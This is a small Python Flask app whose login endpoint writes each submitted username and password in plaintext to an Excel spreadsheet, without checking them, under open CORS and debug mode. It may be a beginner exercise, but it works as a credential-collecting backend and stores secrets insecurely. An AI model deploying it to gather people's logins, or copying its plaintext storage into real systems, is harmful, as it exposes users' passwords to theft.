from flask import Flask, request, jsonify, render_template
from flask_cors import CORS
import pandas as pd
import os
from datetime import datetime

app = Flask(__name__)
CORS(app)

FILE_NAME = "logins.xlsx"

# Home route (optional)
@app.route("/")
def home():
    return render_template("index.html")

# Save login data to Excel
def save_to_excel(username, password):
    data = {
        "Username": [username],
        "Password": [password],
        "Time": [datetime.now().strftime("%Y-%m-%d %H:%M:%S")]
    }

    df_new = pd.DataFrame(data)

    if os.path.exists(FILE_NAME):
        df_old = pd.read_excel(FILE_NAME)
        df_final = pd.concat([df_old, df_new], ignore_index=True)
    else:
        df_final = df_new

    df_final.to_excel(FILE_NAME, index=False)

# Login API
@app.route("/login", methods=["POST"])
def login():
    data = request.get_json()

    username = data.get("username")
    password = data.get("password")

    save_to_excel(username, password)

    return jsonify({"message": "Login saved successfully!"})

if __name__ == "__main__":
    app.run(debug=True)